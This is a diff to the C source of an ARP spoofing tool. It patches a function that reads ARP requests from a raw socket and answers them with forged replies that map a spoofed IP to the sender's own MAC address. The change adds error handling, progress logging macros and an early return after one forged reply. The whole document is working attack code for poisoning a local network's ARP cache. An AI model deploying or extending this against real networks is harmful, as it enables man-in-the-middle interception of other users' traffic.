@@ -28,8 +28,12 @@ SOCKET initiate_socket_for_arp(char ifacename[IFNAMSIZ])
 
 	return iface;
 err:
-	if (iface > 0)
+	if (iface > 0) {
 		close(iface);
+		SOCKET_MODIFY_DENIED(ifacename);
+	}
+	else
+		SOCKET_DENIED();
 	return(-1);	
 }
 
@@ -37,14 +41,19 @@ int arpspoof(SOCKET iface, const attack *attacks_infos)
 {
 	unsigned char buf[4096] = { 0x0 };
 	unsigned char payload[4096] = { 0x0 };
+	int rlen;
 	eth *eth_hdr;
 	arp *arp_hdr;
 	struct sockaddr_ll ifaceinfo;
 	socklen_t ifaceinfolen = sizeof(struct sockaddr_ll);
 
+	TELLSTARTLISTENER(attacks_infos->ifacename);
 	while (1)
 	{
-		int rlen = recvfrom(iface, buf, sizeof(buf), 0, (struct sockaddr*)&ifaceinfo, &ifaceinfolen);
+		rlen = recvfrom(iface, buf, sizeof(buf), 0, (struct sockaddr*)&ifaceinfo, &ifaceinfolen);
+		if (rlen < 0)
+			{ RECVERROR(); return 1; }
+
 		eth_hdr = (eth*)buf;
 		arp_hdr = (arp*)(buf + ETH_HLEN);
 
@@ -58,6 +67,7 @@ int arpspoof(SOCKET iface, const attack *attacks_infos)
 			arp *arp_phdr = (arp*)(payload + ETH_HLEN);
 			struct sockaddr_ll ifaceinfocpy = { 0x0 };
 
+			TELLARPMATCH(arp_hdr->sender_pa, eth_hdr->src_addr);
 			copy_mac(eth_phdr->dest_addr, eth_hdr->src_addr);	/* 6 bytes dest addr */
 			copy_mac(eth_phdr->src_addr, attacks_infos->self_ha);	/* 6 bytes src addr (us) */
 			eth_phdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
@@ -79,13 +89,18 @@ int arpspoof(SOCKET iface, const attack *attacks_infos)
 			ifaceinfocpy.sll_halen = ETH_ALEN;
 			ifaceinfocpy.sll_addr[6] = 0x00;
 			ifaceinfocpy.sll_addr[7] = 0x00;
+
+			TELLSENDARPREPLY(attacks_infos->spoofed_pa, attacks_infos->spoofed_ha);
+
 			rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfocpy, sizeof(ifaceinfocpy));
+			if (rlen != ETH_HLEN + ARP_HLEN)
+				{ SENDERROR(); return 1; }
 
-			printf("%d | %s\n", rlen, strerror(errno));
-
-			ifaceinfolen = sizeof(ifaceinfocpy);
-			memset(&ifaceinfocpy, 0x0, sizeof(ifaceinfocpy));
-			memset(payload, 0x0, 4096);
+			TELLARPREPLYSENT();
+			// ifaceinfolen = sizeof(ifaceinfocpy);
+			// memset(&ifaceinfocpy, 0x0, sizeof(ifaceinfocpy));
+			// memset(payload, 0x0, 4096);
+			return 0;
 		}
 
 		memset(buf, 0x0, 4096);
